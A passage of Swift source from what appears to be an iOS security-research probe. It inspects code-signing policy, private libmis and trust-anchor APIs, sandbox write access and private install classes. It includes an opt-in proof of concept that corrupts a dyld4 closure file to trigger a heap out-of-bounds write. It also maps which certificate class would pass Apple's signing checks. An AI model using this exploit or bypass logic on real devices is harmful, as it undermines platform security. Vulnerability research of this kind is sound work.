        for code in stride(from: UInt32(0xe800_8000), through: UInt32(0xe800_80ff), by: 1) {
            // MISError is a 32-bit code whose top bits are set, so it has to
            // travel as a bit pattern.
            guard let s = f(Int32(bitPattern: code)) else { continue }
            let ns = s as! NSString
            let text = ns as String
            if text.isEmpty || text.lowercased().contains("unknown error") { continue }
            out.append(Fact(String(format: "mis-error 0x%08x", code), text))
            found += 1
            if found > 64 { break }
        }
        if out.isEmpty { out.append(Fact("mis-error-table", "empty")) }
        return out
    }

    /// Run the launch-time validator against the running executable.
    static func run() -> [Fact] {
        var out: [Fact] = []
        out.append(Fact("libmis-dlopen", handle == nil ? "FAILED" : "ok"))
        out.append(Fact("symbol-MISValidateSignature", validateSignature == nil ? "MISSING" : "present"))
        out.append(Fact("symbol-MISValidateSignatureAndCopyInfo", validateAndCopyInfo == nil ? "MISSING" : "present"))
        out.append(Fact("symbol-MISProfileValidateSignature", profileValidateSignature == nil ? "MISSING" : "present"))

        let path = Bundle.main.executableURL?.path ?? ""
        if let v = validateSignature {
            let code = v(path as CFString, nil)
            out.append(Fact("mis-validate-self", String(format: "0x%08x", UInt32(bitPattern: code))))
            out.append(Fact("mis-validate-self-text", errorText(code)))
        }
        if let v = validateAndCopyInfo {
            var info: CFTypeRef?
            let code = v(path as CFString, nil, &info)
            out.append(Fact("mis-validate-copy-info", String(format: "0x%08x", UInt32(bitPattern: code))))
            out.append(Fact("mis-validate-copy-info-text", errorText(code)))
            if let i = info {
                out.append(Fact("mis-info-type", String(describing: type(of: i))))
            }
        }
        return out
    }

    /// Ask libmis to validate OUR OWN embedded profile's signature.
    static func validateOwnProfile(_ profileData: Data?) -> [Fact] {
        var out: [Fact] = []
        guard let profileData, !profileData.isEmpty else {
            out.append(Fact("mis-profile-validate", "no-profile"))
            return out
        }
        guard let create = profileCreateWithData, let validate = profileValidateSignature else {
            out.append(Fact("mis-profile-validate", "symbols-unavailable"))
            return out
        }
        let cf = profileData.withUnsafeBytes { raw -> CFData? in
            CFDataCreate(nil, raw.baseAddress, CFIndex(profileData.count))
        }
        guard let cf = cf, let prof = create(nil, cf)?.takeUnretainedValue() else {
            out.append(Fact("mis-profile-create", "FAILED"))
            return out
        }
        out.append(Fact("mis-profile-create", "ok"))
        if let der = profileIsDEREncoded {
            out.append(Fact("mis-profile-is-der", der(prof) ? "true" : "false"))
        }
        let code = validate(prof)
        out.append(Fact("mis-profile-validate", String(format: "0x%08x", UInt32(bitPattern: code))))
        out.append(Fact("mis-profile-validate-text", errorText(code)))
        if let copyPayload = profileCopyPayload {
            if let payload = copyPayload(prof) {
                if CFGetTypeID(payload) == CFDataGetTypeID() {
                    let d = unsafeBitCast(payload, to: CFData.self)
                    out.append(Fact("mis-profile-payload-bytes", String(CFDataGetLength(d))))
                } else {
                    out.append(Fact("mis-profile-payload-bytes", "not-cfdata"))
                }
            }
        }
        if let gv = profileGetValue {
            for key in ["Entitlements", "AppleInternalProfile", "LocalProvision", "IsXcodeManaged", "UUID"] {
                if let v = gv(prof, key as CFString) {
                    out.append(Fact("mis-profile-value \(key)", Ents.describe(v)))
                }
            }
        }
        return out
    }
}

// MARK: - Runtime anchor enumeration

enum AnchorSet {
    typealias GetAnchors = @convention(c) () -> CFTypeRef?
    typealias CopyCorporateRoots = @convention(c) () -> CFTypeRef?
    typealias CopyTrustAnchors = @convention(c) (CFTypeRef) -> CFTypeRef?

    static let getAnchors: GetAnchors? = {
        guard let s = DynSec.sym("SecGetAppleTrustAnchors") else { return nil }
        return unsafeBitCast(s, to: GetAnchors.self)
    }()
    static let copyCorporateRoots: CopyCorporateRoots? = {
        guard let s = DynSec.sym("SecCertificateCopyAppleCorporateRoots") else { return nil }
        return unsafeBitCast(s, to: CopyCorporateRoots.self)
    }()
    static let copyTrustAnchors: CopyTrustAnchors? = {
        guard let s = DynSec.sym("SecTrustCopyAppleAnchors") else { return nil }
        return unsafeBitCast(s, to: CopyTrustAnchors.self)
    }()

    /// SHA-256 prefix of the PUBLIC "Apple Root CA" (the reference fingerprint).
    static let publicAppleRootSHA256 = "b0b1730ecbc7ff4505142c49"

    static func sha256(_ cert: SecCertificate) -> String {
        let d = SecCertificateCopyData(cert) as Data
        return B64.sha256(d)
    }

    static func describe(_ arrRef: CFTypeRef?, label: String) -> [Fact] {
        var out: [Fact] = []
        guard let raw = arrRef else {
            out.append(Fact(label, "absent"))
            return out
        }
        if CFGetTypeID(raw) != CFArrayGetTypeID() {
            out.append(Fact(label, "not-an-array"))
            return out
        }
        let arr = unsafeBitCast(raw as AnyObject, to: CFArray.self)
        let n = CFArrayGetCount(arr)
        out.append(Fact("\(label)-count", String(n)))
        var sawPublicRoot = false
        for i in 0..<n {
            guard let p = CFArrayGetValueAtIndex(arr, i) else { continue }
            let cert = unsafeBitCast(p, to: SecCertificate.self)
            let h = sha256(cert)
            if h.hasPrefix(publicAppleRootSHA256) { sawPublicRoot = true }
            out.append(Fact("\(label)[\(i)]-sha256", h))
        }
        out.append(Fact("\(label)-contains-public-apple-root", sawPublicRoot ? "YES" : "no"))
        return out
    }

    static func run() -> [Fact] {
        var out: [Fact] = []
        out.append(Fact("symbol-SecGetAppleTrustAnchors", getAnchors == nil ? "MISSING" : "present"))
        if let g = getAnchors {
            for fct in describe(g(), label: "runtime-anchors") { out.append(fct) }
        }
        if let c = copyCorporateRoots {
            for fct in describe(c(), label: "corporate-roots") { out.append(fct) }
        }
        return out
    }
}

// MARK: - Trust evaluation

enum TrustProbe {
    typealias CreateTrust = @convention(c) (CFTypeRef, CFTypeRef, UnsafeMutablePointer<SecTrust?>) -> Int32
    typealias EvaluateTrust = @convention(c) (CFTypeRef, UnsafeMutablePointer<Unmanaged<CFError>?>) -> Int32

    static let createTrust: CreateTrust? = {
        guard let s = DynSec.sym("SecTrustCreateWithCertificates") else { return nil }
        return unsafeBitCast(s, to: CreateTrust.self)
    }()
    static let evaluateTrust: EvaluateTrust? = {
        guard let s = DynSec.sym("SecTrustEvaluateWithError") else { return nil }
        return unsafeBitCast(s, to: EvaluateTrust.self)
    }()

    static func evaluate(derCerts: [Data]) -> [Fact] {
        var out: [Fact] = []
        guard let mkTrust = createTrust, let evaluate = evaluateTrust else {
            out.append(Fact("trust", "symbols-unavailable"))
            return out
        }
        guard !derCerts.isEmpty else {
            out.append(Fact("trust-eval", "no-chain"))
            return out
        }
        var certsFound: [SecCertificate] = []
        for (i, der) in derCerts.enumerated() {
            let cf = der.withUnsafeBytes { raw -> CFData? in
                CFDataCreate(nil, raw.baseAddress, CFIndex(der.count))
            }
            if let cf = cf, let cert = SecCertificateCreateWithData(nil, cf) {
                certsFound.append(cert)
                out.append(Fact("chain[\(i)]-sha256", B64.sha256(der)))
            }
        }
        guard let first = certsFound.first else {
            out.append(Fact("trust-eval", "no-chain"))
            return out
        }
        var trust: SecTrust?
        let terr = mkTrust(first, SecPolicyCreateBasicX509(), &trust)
        guard terr == 0, let t = trust else {
            out.append(Fact("trust-basic-x509", "create-failed(\(terr))"))
            return out
        }
        var err: Unmanaged<CFError>?
        let v = evaluate(t, &err)
        out.append(Fact("trust-basic-x509", v == 0 ? "TRUSTED" : "NOT-TRUSTED(\(v))"))
        if let chain = SecTrustCopyCertificateChain(t) {
            let n = CFArrayGetCount(chain)
            out.append(Fact("trust-chain-count", String(n)))
            for i in 0..<n {
                guard let p = CFArrayGetValueAtIndex(chain, i) else { continue }
                let cert = unsafeBitCast(p, to: SecCertificate.self)
                out.append(Fact("trust-chain[\(i)]-sha256", AnchorSet.sha256(cert)))
            }
        }
        return out
    }
}

// MARK: - Effects: is the sandbox actually off?

enum Effects {
    static func run() -> [Fact] {
        var out: [Fact] = []
        let pid = ProcessInfo.processInfo.processIdentifier

        let writable = "/private/var/mobile/Library/probe-\(pid).txt"
        do {
            try "probe".write(toFile: writable, atomically: true, encoding: .utf8)
            out.append(Fact("write-outside-container", "ALLOWED"))
            try? FileManager.default.removeItem(atPath: writable)
        } catch {
            out.append(Fact("write-outside-container", "DENIED"))
        }

        let readable = "/private/var/mobile/Library/Caches"
        out.append(Fact("read-private-dir", FileManager.default.fileExists(atPath: readable) ? "VISIBLE" : "HIDDEN"))

        let systemDir = "/private/var/db"
        out.append(Fact("read-system-db", FileManager.default.fileExists(atPath: systemDir) ? "VISIBLE" : "HIDDEN"))

        out.append(Fact("container-home", FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first?.path ?? "-"))
        out.append(Fact("uid", String(getuid())))
        out.append(Fact("euid", String(geteuid())))
        out.append(Fact("gid", String(getgid())))
        return out
    }
}

// MARK: - Privileged install channel

enum InstallProbe {
    static let classNames = [
        "IXAppInstallCoordinator",
        "IXSimpleInstaller",
        "MIMobileInstallation",
        "MIInstaller",
        "MobileInstallation",
    ]
    static let interesting = ["installApplication", "install", "consumeSource", "coordinate"]

    static func run() -> [Fact] {
        var out: [Fact] = []

        let gate = Ents.value("com.apple.private.mobileinstall.allowedSPI")
        out.append(Fact("install-gate-allowedSPI", gate.present ? "PRESENT" : "absent"))
        let daemon = Ents.value("com.apple.private.installcoordinationd.daemon")
        out.append(Fact("install-gate-coordinationd", daemon.present ? "PRESENT" : "absent"))

        for name in classNames {
            guard let cls = NSClassFromString(name) else {
                out.append(Fact("class:\(name)", "absent"))
                continue
            }
            out.append(Fact("class:\(name)", "present"))
            var selectors: [String] = []
            var count: UInt32 = 0
            if let methods = class_copyMethodList(object_getClass(cls), &count) {
                for i in 0..<Int(count) { selectors.append(NSStringFromSelector(method_getName(methods[i]))) }
                free(methods)
            }
            if let meta = object_getClass(cls) {
                if let methods = class_copyMethodList(meta, &count) {
                    for i in 0..<Int(count) { selectors.append(NSStringFromSelector(method_getName(methods[i]))) }
                    free(methods)
                }
            }
            let hits = selectors.filter { s in interesting.contains { $0.isEmpty ? false : s.contains($0) } }
            out.append(Fact("selectors:\(name)", hits.isEmpty ? "none" : hits.joined(separator: " | ")))
        }
        return out
    }
}

// MARK: - Theory / verdict model

/// One measured fact.  A struct, not a tuple: a tuple has no `.key`/`.value`
/// members, which is exactly the kind of thing a type-checker should catch.
struct Fact {
    let key: String
    let value: String
    init(_ k: String, _ v: String) { key = k; value = v }
}

struct Verdict {
    let id: String
    let title: String
    let state: String       // CONFIRMED / REFUTED / CONSISTENT / INCONCLUSIVE / NEEDS-LOG / N/A
    let evidence: String
}

enum Theories {
    /// The full contract.  THEORIES.md is the human-readable twin of this
    /// list; the ids must stay in sync.
    static let all: [String] = [
        "T01", "T02", "T03", "T04", "T05", "T06", "T07", "T08", "T09",
        "T10", "T11", "T12", "T13", "T14",
    ]
}


// MARK: - dyld4 Prebuilt Loader Set OOB probe
//
// A43/A44/A48 proved a heap OOB in dyld4: `PrebuiltLoader::isValid`
// indexes a `malloc(count)` validation array with `loader->ref & 0x7fff`
// and never compares the index to count. The writes are `strb #1`,
// `strb #0xff`, `strb #2` at 0x1804b7a84 / 0x1804b7b90 / 0x1804b794c.
//
// The closure is created by dyld itself in the app's container:
//   $HOME/Library/Caches/com.apple.dyld/<gradedArch>.dyld4
// with xattr "com.apple.dyld" holding the boot token. No DYLD_USE_CLOSURES
// needed for a containerized HOME (A44).
//
// This probe reads that REAL closure and reports whether dyld already
// performed an OOB access during THIS process's startup. It does not
// modify anything unless the explicit PoC is invoked.

enum Dyld4Probe {
    static let magic: UInt32 = 0x7370_3464     // "dp04" little-endian
    static let versionHash: UInt32 = 0x9593_b355
    static let xattrName = "com.apple.dyld"

    struct Finding {
        var path = ""
        var present = false
        var size = 0
        var magicOK = false
        var versionOK = false
        var count: UInt32 = 0
        var arrayOff: UInt32 = 0
        var loaders: [(index: Int, ref: UInt16, idx: Int, oob: Bool)] = []
        var bootToken = ""
        var verdict = "NO-CLOSURE"
        var note = ""
    }

    static func u32(_ d: Data, _ off: Int) -> UInt32? {
        guard off >= 0, off + 4 <= d.count else { return nil }
        return d.withUnsafeBytes { raw in
            raw.load(fromByteOffset: off, as: UInt32.self)
        }
    }
    static func u16(_ d: Data, _ off: Int) -> UInt16? {
        guard off >= 0, off + 2 <= d.count else { return nil }
        return d.withUnsafeBytes { raw in
            raw.load(fromByteOffset: off, as: UInt16.self)
        }
    }

    static func closureDirectory() -> String {
        (NSHomeDirectory() as NSString).appendingPathComponent("Library/Caches/com.apple.dyld")
    }

    /// Enumerate every *.dyld4 file; the graded-arch id is shared by all
    /// arm64e apps, so guessing one filename is unsafe.
    static func closurePaths() -> [String] {
        let dir = closureDirectory()
        guard let names = try? FileManager.default.contentsOfDirectory(atPath: dir) else { return [] }
        return names.filter { $0.hasSuffix(".dyld4") }
            .map { (dir as NSString).appendingPathComponent($0) }
            .sorted()
    }

    static func bootToken(_ path: String) -> String {
        let n = xattrName.withCString { name -> Int in
            Int(getxattr(path, name, nil, 0, 0, 0))
        }
        guard n > 0, n <= 256 else { return "-" }
        var buf = [CChar](repeating: 0, count: n + 1)
        let got = xattrName.withCString { name -> Int in
            buf.withUnsafeMutableBytes { raw in
                Int(getxattr(path, name, raw.baseAddress, n, 0, 0))
            }
        }
        guard got > 0 else { return "-" }
        return Data(bytes: buf, count: got).map { String(format: "%02x", $0) }.joined()
    }

    static func inspect(_ path: String) -> Finding {
        var f = Finding()
        f.path = path
        guard let d = FileManager.default.contents(atPath: path), d.count >= 0x14 else {
            f.note = "unreadable or too short"
            return f
        }
        f.present = true
        f.size = d.count
        f.magicOK = u32(d, 0) == magic
        f.versionOK = u32(d, 4) == versionHash
        f.bootToken = bootToken(path)
        guard f.magicOK, f.versionOK else {
            f.verdict = "BAD-HEADER"
            f.note = String(format: "magic=0x%08x version=0x%08x",
                            u32(d, 0) ?? 0, u32(d, 4) ?? 0)
            return f
        }
        guard let count = u32(d, 0xc), let arrayOff = u32(d, 0x10) else {
            f.verdict = "SHORT-HEADER"
            return f
        }
        f.count = count
        f.arrayOff = arrayOff
        let base = Int(arrayOff)
        guard base >= 0 else { f.verdict = "BAD-ARRAY-OFF"; return f }

        // PLS::isValid iterates loader offsets with a 16-bit truncated index.
        let loopCount = Int(count & 0xffff)
        for i in 0..<loopCount {
            guard let off = u32(d, base + i * 4) else { break }
            let lp = base + Int(off)
            guard let ref = u16(d, lp + 0x6) else {
                f.loaders.append((i, 0, 0, true))
                continue
            }
            let idx = Int(ref & 0x7fff)
            let oob = idx >= Int(count)
            f.loaders.append((i, ref, idx, oob))
        }
        let bad = f.loaders.filter { $0.oob }
        f.verdict = bad.isEmpty ? "NO-OOB-IN-THIS-CLOSURE" : "OOB-CONFIRMED"
        if !bad.isEmpty {
            let w = bad.prefix(4).map { "loader\($0.index):ref=\(String(format: "0x%04x", $0.ref)) idx=\($0.idx) count=\(f.count)" }
            f.note = w.joined(separator: " | ")
        } else {
            f.note = "loaders=\(f.loaders.count) count=\(count) — no ref exceeds count"
        }
        return f
    }

    /// Explicit, opt-in PoC: patch one loader's Ref to 0xffff while keeping
    /// the boot token, spawn a child of this same executable, then restore.
    /// The child re-runs the probe and reports OOB-CONFIRMED on the crafted
    /// closure; its exit status is the runtime evidence.
    @discardableResult
    static func runPoC() -> String {
        let paths = closurePaths()
        guard let path = paths.first else { return "PoC: no closure file to patch" }
        guard let original = FileManager.default.contents(atPath: path) else { return "PoC: read failed" }
        let token = bootToken(path)
        var crafted = original
        // locate first loader offset and patch its Ref (u16 at +0x6)
        guard let count = u32(original, 0xc), let arrayOff = u32(original, 0x10),
              let firstOff = u32(original, Int(arrayOff)) else {
            return "PoC: cannot locate loader[0]"
        }
        let refOff = Int(arrayOff) + Int(firstOff) + 0x6
        guard refOff + 2 <= crafted.count else { return "PoC: ref offset out of range" }
        crafted[refOff] = 0xff
        crafted[refOff + 1] = 0xff
        let backup = path + ".probe-backup"
        try? original.write(to: URL(fileURLWithPath: backup), options: .atomic)
        defer {                                   // ALWAYS restore
            try? original.write(to: URL(fileURLWithPath: path), options: .atomic)
            try? FileManager.default.removeItem(atPath: backup)
        }
        guard (try? crafted.write(to: URL(fileURLWithPath: path), options: .atomic)) != nil else {
            return "PoC: write failed"
        }
        // The xattr is unchanged (we rewrote only the file body), so the
        // boot token still matches this executable.
        let exe = Bundle.main.executableURL!.path
        var pid: pid_t = 0
        let argv0 = strdup(exe)
        defer { free(argv0) }
        var argv: [UnsafeMutablePointer<CChar>?] = [argv0, nil]
        let rc = argv.withUnsafeMutableBufferPointer { buf -> Int32 in
            posix_spawn(&pid, exe, nil, nil, buf.baseAddress, environ)
        }
        var status: Int32 = 0
        let waited = rc == 0 ? waitpid(pid, &status, 0) : -1
        return String(format: "PoC: patched ref=0xffff count=%u token=%@ spawn=%d pid=%d wait=%d status=%d (restored)",
                      count, token, rc, pid, waited, status)
    }
}

// MARK: - Harness

final class Facts {
    var signature: EmbeddedSignature = EmbeddedSignature()
    var sliceInfos: [SliceInfo] = []
    var profileData: Data? = nil
    var profileDict: [String: Any] = [:]
    var profileKind: String = "none"
    var chainCerts: [Data] = []          // from the CMS blob of the running binary
    var profileCerts: [Data] = []        // DeveloperCertificates
    var honoured: [String: String] = [:]
    var claimed: [String: String] = [:]
    var perCertBits: [(String, UInt64, [String])] = []
    var predictedPolicy: UInt64 = 0
    var strictPolicy: UInt64 = 0
    var chainRootSHA256: String = ""
    var chainRootIsPublicAppleRoot = false
    var trustResult = "-"
    var dyld4Findings: [Dyld4Probe.Finding] = []
    var dyld4PoC = "-"
    var mis: [Fact] = []
    var misProfile: [Fact] = []
    var anchors: [Fact] = []
    var effects: [Fact] = []
    var install: [Fact] = []
    var anchorHasPublicRoot = false
    var runtimeAnchorHasPublicRoot = false
    var leafClassOID: String? = nil
    var scenario = "unknown"
}

func readProfile() -> (Data?, [String: Any], String) {
    guard let url = Bundle.main.url(forResource: "embedded", withExtension: "mobileprovision"),
          let d = try? Data(contentsOf: url), !d.isEmpty else {
        return (nil, [:], "none")
    }
    // A real mobileprovision is a CMS (DER) wrapper around the plist.
    var plistData: Data? = nil
    if let xml = d.range(of: Data("<?xml".utf8)) {
        plistData = d[xml.lowerBound...]
    } else if let bin = d.range(of: Data("bplist00".utf8)) {
        plistData = d[bin.lowerBound...]
    } else if d.count > 20000 {
        plistData = d
    }
    guard let pd = plistData,
          let plist = try? PropertyListSerialization.propertyList(from: pd, options: [], format: nil),
          let dict = plist as? [String: Any] else {
        return (d, [:], "cms-unparsed")
    }
    // A profile whose CMS is signed by Apple parses the same way as a crafted
    // one; the difference is visible in libmis' own verdict.
    let kind = (d.count > 20000 || d.prefix(4).elementsEqual(Data([0x30, 0x82, 0x01, 0x22])))
        ? "cms" : "plain-plist"
    return (d, dict, kind)
}

func runHarness(r: Report) -> Facts {
    CrashGuard.install(r)
    let f = Facts()

    r.add("=== iOS private-entitlement probe — differential run ===")
    r.add("run-utc=\(ISO8601DateFormatter().string(from: Date()))")
    r.add("device-os=\(UIDevice.current.systemVersion)")
    r.add("device-model=\(UIDevice.current.model)")
    r.add("bundle-id=\(Bundle.main.bundleIdentifier ?? "-")")
    r.add("process-id=\(String(ProcessInfo.processInfo.processIdentifier))")
    r.add("executable=\(Bundle.main.executableURL?.path ?? "-")")
    // The scenario builder seals a marker file into the bundle, so the app can
    // name the variant it was installed as.
    let variantLabel = (Bundle.main.url(forResource: "variant", withExtension: "txt")
                        .flatMap { try? String(contentsOf: $0, encoding: .utf8) }?
                        .trimmingCharacters(in: .whitespacesAndNewlines)) ?? "-"
    r.add("variant-label", variantLabel.isEmpty ? "-" : variantLabel)

    // 1. SIGNATURE ------------------------------------------------------------
    r.section("SIGNATURE")
    let execPath = Bundle.main.executableURL?.path ?? ""
    let (sig, slices) = MachO.readSignature(at: execPath)
    f.signature = sig
    f.sliceInfos = slices
    r.add("signature-present", sig.codeDirectoryOffset >= 0 ? "yes" : "no")
    r.add("signature-is-fat", sig.isFat ? "yes" : "no")
    r.add("signature-adhoc", sig.adhoc ? "yes" : "no")
    r.add("identifier", sig.identifier.isEmpty ? "-" : sig.identifier)
    r.add("team-id", sig.teamID.isEmpty ? "-" : sig.teamID)
    r.add("codedirectory-version", String(format: "0x%x", sig.codeDirectoryVersion))
    r.add("exec-seg-flags", Bits.hex(sig.execSegFlags))
    r.add("exec-seg-flags-bits", Bits.list(sig.execSegFlags))
    r.add("superblob-slots", sig.slots.map { String(format: "0x%x", $0.type) }.joined(separator: ","))
    r.add("entitlements-slot-present", sig.entitlementsSlotPresent ? "yes" : "no")
    r.add("entitlements-blob-note", sig.entitlementsNote.isEmpty ? "-" : sig.entitlementsNote)
    let bytes0 = [UInt8](FileManager.default.contents(atPath: execPath) ?? Data())
    let sb0 = sig.superBlobOffset
    r.add("entitlements-blob-head-hex", sig.entitlementsHex.isEmpty ? "-" : sig.entitlementsHex)
    // the whole slot table, with each blob's magic and length, so a format
    // question is answered by the bytes instead of by another guess
    for sl in sig.slots {
        let o = sb0 + sl.offset
        guard o + 8 <= bytes0.count else { continue }
        let magic = MachO.readU32BE(bytes0, o)
        let len = MachO.readU32BE(bytes0, o + 4)
        r.add(String(format: "slot 0x%04x", sl.type),
              String(format: "off=0x%x magic=0x%08x len=%d head=%@", sl.offset, magic, len,
                     bytes0[o..<min(o + 16, bytes0.count)].map { String(format: "%02x", $0) }.joined()))
    }
    for s in slices {
        r.add("slice[\(s.index)]", "cpu=0x\(String(s.cputype, radix: 16)) subtype=0x\(String(s.cpusubtype, radix: 16)) id=\(s.identifier) cd=0x\(String(s.codeDirectoryVersion, radix: 16)) execSegFlags=\(Bits.hex(s.execSegFlags))")
        r.add("slice[\(s.index)]-claimed-entitlements", s.claimedEntitlements.isEmpty ? "-" : s.claimedEntitlements.keys.sorted().joined(separator: ","))
        r.add("slice[\(s.index)]-claimed-private", s.claimedEntitlements.keys.filter { $0.hasPrefix("com.apple.private.") }.sorted().joined(separator: ","))
    }
    for c in sig.policyFieldCandidates {
        r.add("policy-field \(c.name)", Bits.hex(c.value))
        r.add("policy-field \(c.name) bits", Bits.list(c.value))
    }
    r.add("amfi-accept-mask", Bits.hex(CTPolicy.acceptMask))
    r.add("amfi-accept-mask-bits", Bits.list(CTPolicy.acceptMask))
    r.add("amfi-fastpath-mask", Bits.hex(CTPolicy.fastPathMask))
    r.add("amfi-fastpath-bits", Bits.list(CTPolicy.fastPathMask))
    r.add("amfi-internal-profile-mask", Bits.hex(CTPolicy.internalProfileMask))
    r.add("amfi-internal-profile-bits", Bits.list(CTPolicy.internalProfileMask))

    // 2. CHAIN ----------------------------------------------------------------
    r.section("CHAIN")
    var chainOIDs: [[String]] = []
    if let cms = sig.cmsBlob {
        let certs = DER.certificates(in: cms)
        f.chainCerts = certs
        r.add("cms-blob-bytes", String(cms.count))
        r.add("cms-certificates-found", String(certs.count))
        for (i, c) in certs.enumerated() {
            let oids = DER.appleOIDs(in: c)
            chainOIDs.append(oids)
            let b = CTPolicy.bits(forOIDs: oids)
            f.perCertBits.append(("cms-cert[\(i)]", b.bits, b.matched))
            r.add("cms-cert[\(i)]-sha256", B64.sha256(c))
            r.add("cms-cert[\(i)]-apple-oids", oids.isEmpty ? "none" : oids.joined(separator: ","))
            r.add("cms-cert[\(i)]-ct-bits", Bits.hex(b.bits))
            r.add("cms-cert[\(i)]-ct-bit-numbers", Bits.list(b.bits))
            if let cls = oids.first(where: { $0.hasPrefix("1.2.840.113635.100.6.1.") }) {
                f.leafClassOID = cls
            }
        }
    } else {
        r.add("cms-blob-bytes", "0")
        r.add("cms-certificates-found", "0")
    }

    // 3. PROFILE --------------------------------------------------------------
    r.section("PROFILE")
    let (pdata, pdict, pkind) = readProfile()
    f.profileData = pdata
    f.profileDict = pdict
    f.profileKind = pkind
    r.add("profile-present", pdata == nil ? "no" : "yes")
    r.add("profile-kind", pkind)
    if let pd = pdata {
        r.add("profile-size", String(pd.count))
        r.add("profile-keys", pdict.keys.sorted().joined(separator: ","))
        r.add("profile-apple-internal-profile", (pdict["AppleInternalProfile"] as? Bool).map { $0 ? "true" : "false" } ?? "-")
        r.add("profile-local-provision", (pdict["LocalProvision"] as? Bool).map { $0 ? "true" : "false" } ?? "-")
        r.add("profile-is-xcode-managed", (pdict["IsXcodeManaged"] as? Bool).map { $0 ? "true" : "false" } ?? "-")
        r.add("profile-uuid", (pdict["UUID"] as? String) ?? "-")
        r.add("profile-team-identifier", ((pdict["TeamIdentifier"] as? [String]) ?? []).joined(separator: ","))
        r.add("profile-expiration", ((pdict["ExpirationDate"] as? Date)?.description) ?? "-")
        if let ents = pdict["Entitlements"] as? [String: Any] {
            r.add("profile-entitlements", ents.keys.sorted().joined(separator: ","))
            r.add("profile-entitlements-private", ents.keys.filter { $0.hasPrefix("com.apple.private.") }.sorted().joined(separator: ","))
        } else {
            r.add("profile-entitlements", "-")
        }
        if let ders = pdict["DeveloperCertificates"] as? [Data] {
            f.profileCerts = ders
            r.add("profile-developer-certificates", String(ders.count))
            for (i, d) in ders.enumerated() {
                let oids = DER.appleOIDs(in: d)
                // NOT appended to chainOIDs: the profile's DeveloperCertificates
                // are the certificates the profile authorises, not the chain
                // the kernel verifies.  The policy is computed from the
                // certificates inside the binary's own CMS blob.
                let b = CTPolicy.bits(forOIDs: oids)
                f.perCertBits.append(("profile-cert[\(i)]", b.bits, b.matched))
                r.add("profile-cert[\(i)]-sha256", B64.sha256(d))
                r.add("profile-cert[\(i)]-apple-oids", oids.isEmpty ? "none" : oids.joined(separator: ","))
                r.add("profile-cert[\(i)]-ct-bits", Bits.hex(b.bits))
                r.add("profile-cert[\(i)]-ct-bit-numbers", Bits.list(b.bits))
                if let cls = oids.first(where: { $0.hasPrefix("1.2.840.113635.100.6.1.") }) {
                    f.leafClassOID = f.leafClassOID ?? cls
                }
            }
        } else {
            r.add("profile-developer-certificates", "0")
        }
    }

    // The predicted CT policy.  The chain that matters is the one the kernel
    // sees: the certificates inside the binary's own CMS blob.  The profile's
    // DeveloperCertificates are a *different* list (the certificates the
    // profile authorises) and are reported, but they are not ANDed in.
    if !chainOIDs.isEmpty {
        f.predictedPolicy = CTPolicy.policy(chain: chainOIDs)
        f.strictPolicy = CTPolicy.strictPolicy(chain: chainOIDs)
    }
    r.add("predicted-ct-policy", Bits.hex(f.predictedPolicy))
    r.add("predicted-ct-policy-bits", Bits.list(f.predictedPolicy))
    r.add("predicted-ct-policy-strict-all-certs", Bits.hex(f.strictPolicy))
    r.add("predicted-ct-policy-in-accept-mask", (f.predictedPolicy & CTPolicy.acceptMask) != 0 ? "YES" : "no")
    r.add("predicted-ct-policy-has-fastpath-bit", (f.predictedPolicy & CTPolicy.fastPathMask) != 0 ? "YES" : "no")
    r.add("predicted-ct-policy-has-internal-profile-bit", (f.predictedPolicy & CTPolicy.internalProfileMask) != 0 ? "YES" : "no")

    // The anchor of the chain, and whether it is the PUBLIC Apple Root CA.
    if let root = f.chainCerts.last {
        let h = B64.sha256(root)
        f.chainRootSHA256 = h
        let isPublic = h.hasPrefix(AnchorSet.publicAppleRootSHA256)
        f.chainRootIsPublicAppleRoot = isPublic
        r.add("chain-root-sha256", h)
        r.add("chain-root-is-public-apple-root", isPublic ? "YES" : "no")
    } else {
        r.add("chain-root-sha256", "-")
        r.add("chain-root-is-public-apple-root", "no-chain")
    }

    // WHAT-IF: which leaf class would produce which path.  This is the map
    // of the target: it says exactly which certificate the experiment needs.
    r.section("WHAT-IF (leaf class -> policy -> path)")
    let leafIndex = chainOIDs.isEmpty ? -1 : 0
    for cls in CTPolicy.knownClasses {
        guard let bits = CTPolicy.oidBitNumbers[cls] else { continue }
        let pol = leafIndex >= 0 ? CTPolicy.whatIf(chain: chainOIDs, index: leafIndex, classOID: cls) : 0
        let inMask = (pol & CTPolicy.acceptMask) != 0
        let fast = (pol & CTPolicy.fastPathMask) != 0
        let path = fast ? "app-store-fast-path" : (inMask ? "accepted-mask-only" : "rejected")
        r.add("WHAT-IF leaf=\(cls)", "bits=\(Bits.list(bits)) policy=\(Bits.hex(pol)) in-mask=\(inMask ? "YES" : "no") fastpath=\(fast ? "YES" : "no") path=\(path)")
    }

    // 3b. DYLD4 PREBUILT LOADER OOB -------------------------------------------
    r.section("DYLD4-OOB")
    f.dyld4Findings = Dyld4Probe.closurePaths().map { Dyld4Probe.inspect($0) }
    if f.dyld4Findings.isEmpty {
        r.add("dyld4-closure-present", "no")
        r.add("dyld4-verdict", "NO-CLOSURE")
    }
    for (i, c) in f.dyld4Findings.enumerated() {
        r.add("dyld4[\(i)]-path", c.path)
        r.add("dyld4[\(i)]-size", String(c.size))
        r.add("dyld4[\(i)]-magic-ok", c.magicOK ? "YES" : "no")
        r.add("dyld4[\(i)]-version-ok", c.versionOK ? "YES" : "no")
        r.add("dyld4[\(i)]-count", String(c.count))
        r.add("dyld4[\(i)]-array-off", String(c.arrayOff))
        r.add("dyld4[\(i)]-boot-token", c.bootToken)
        r.add("dyld4[\(i)]-loaders", String(c.loaders.count))
        let bad = c.loaders.filter { $0.oob }
        r.add("dyld4[\(i)]-oob-count", String(bad.count))
        for l in bad.prefix(8) {
            r.add("dyld4[\(i)]-oob-loader", "index=\(l.index) ref=0x" +
                  String(format: "%04x", l.ref) + " idx=\(l.idx) count=\(c.count)")
        }
        r.add("dyld4[\(i)]-verdict", c.verdict)
        r.add("dyld4[\(i)]-note", c.note)
    }

    // 4. LIBMIS ----------------------------------------------------------------
    r.section("LIBMIS")
    f.mis = Mis.run()
    for fct in f.mis { r.add(fct.key, fct.value) }
    for fct in Mis.errorTable() { r.add(fct.key, fct.value) }
    f.misProfile = Mis.validateOwnProfile(f.profileData)
    for fct in f.misProfile { r.add(fct.key, fct.value) }

    // 5. ENTITLEMENTS ---------------------------------------------------------
    r.section("ENTITLEMENTS")
    f.honoured = Ents.honoured()
    f.claimed = slices.first?.claimedEntitlements ?? [:]
    r.add("claimed-count", String(f.claimed.count))
